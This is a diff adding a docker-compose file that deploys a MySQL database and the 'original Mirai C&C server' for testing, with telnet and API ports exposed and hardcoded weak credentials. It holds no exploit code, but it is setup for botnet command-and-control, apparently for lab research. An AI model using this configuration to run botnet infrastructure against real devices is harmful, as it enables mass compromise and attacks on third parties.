@@ -1,0 +1,52 @@
+version: '3.8'
+
+services:
+  # MySQL database for C&C
+  mysql:
+    image: mysql:8.0
+    container_name: mirai-cnc-mysql
+    environment:
+      MYSQL_ROOT_PASSWORD: password
+      MYSQL_DATABASE: mirai
+      MYSQL_USER: mirai
+      MYSQL_PASSWORD: mirai_pass
+    ports:
+      - "3306:3306"
+    volumes:
+      - mysql_data:/var/lib/mysql
+      - ./mirai/cnc/database.py:/docker-entrypoint-initdb.d/init.sql:ro
+    networks:
+      - cnc-network
+    healthcheck:
+      test: ["CMD", "mysqladmin", "ping", "-h", "localhost"]
+      interval: 10s
+      timeout: 5s
+      retries: 5
+
+  # Original Mirai C&C Server (for testing)
+  cnc-original:
+    build:
+      context: .
+      dockerfile: docker/Dockerfile.cnc-original
+    container_name: mirai-cnc-original
+    ports:
+      - "2323:23"    # Telnet interface
+      - "8101:101"   # API interface
+    depends_on:
+      mysql:
+        condition: service_healthy
+    environment:
+      - DATABASE_HOST=mysql
+      - DATABASE_USER=mirai
+      - DATABASE_PASS=mirai_pass
+      - DATABASE_NAME=mirai
+    networks:
+      - cnc-network
+    restart: unless-stopped
+
+networks:
+  cnc-network:
+    driver: bridge
+
+volumes:
+  mysql_data:
